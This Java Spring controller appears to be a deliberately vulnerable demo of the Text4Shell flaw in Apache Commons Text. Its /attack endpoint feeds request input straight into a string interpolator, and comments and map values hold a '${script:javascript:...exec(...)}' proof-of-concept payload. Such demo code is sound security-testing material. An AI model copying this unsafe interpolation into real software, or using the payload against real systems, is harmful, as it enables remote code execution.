package com.levo.dockerexample.controller;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.text.StringSubstitutor;

import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("text4shell")
public class HelloController {

	@RequestMapping(value = "/attack", method = RequestMethod.GET)
	@ResponseBody
	public String attack(@RequestParam(defaultValue="5up3r541y4n") String search) {
		StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
		// String pocstring = "${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}";
		try{
			String pwn = interpolator.replace(search);
		} catch(Exception e) {
			System.out.println(e);
		}
		return "Search results for: " + search;
	}

	@RequestMapping(value = "/attackTwo", method = RequestMethod.GET)
	@ResponseBody
	public String attackTwo(@RequestParam(defaultValue="5up3r541y4n") String search) {
		// This is copied example code from the Apache Commons Text test folder (see `<REPO>/copied-tests-from-apache-commons-text` for original tests).

		Map<String, String> valuesMap = new HashMap<>();
		valuesMap.put("animal", "${critter}");
		valuesMap.put("critter", "${critterSpeed} ${critterColor} ${critterType} ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo-unique')}");
		valuesMap.put("critterSpeed", "quick");
		valuesMap.put("critterColor", "brown");
		valuesMap.put("critterType", "fox");

		StringSubstitutor substitutor = new StringSubstitutor(valuesMap);

		// Even if this is false, the recursive variables seem to still resolve.
		substitutor.setEnableSubstitutionInVariables(true);

		// String pocstring = "${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}";
		try {
			// This is NOT exploitable as far as we can tell.
			// The variables are resolved recursively, but the ${script:*} is never executed.
			String pwn = substitutor.replace("${animal} ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo-unique')}");
			return pwn;
		} catch(Exception e) {
			System.out.println(e);
		}
		return "Search results for: " + search;
	}

}
